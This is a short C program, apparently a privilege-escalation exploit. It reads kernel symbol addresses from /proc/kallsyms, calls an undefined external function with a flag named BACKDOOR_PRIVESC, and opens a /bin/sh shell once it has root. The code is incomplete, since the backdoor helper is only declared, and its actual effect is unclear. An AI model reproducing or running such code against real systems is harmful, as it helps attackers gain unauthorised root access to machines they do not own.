#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define BACKDOOR_PRIVESC 1
extern void smm_call(int);
int main(void) {
  FILE *f = popen("cat /proc/kallsyms | grep sys_getuid", "r");
  smm_call(BACKDOOR_PRIVESC);
  if (getuid() == 0) system("/bin/sh");
  return f == NULL;
}
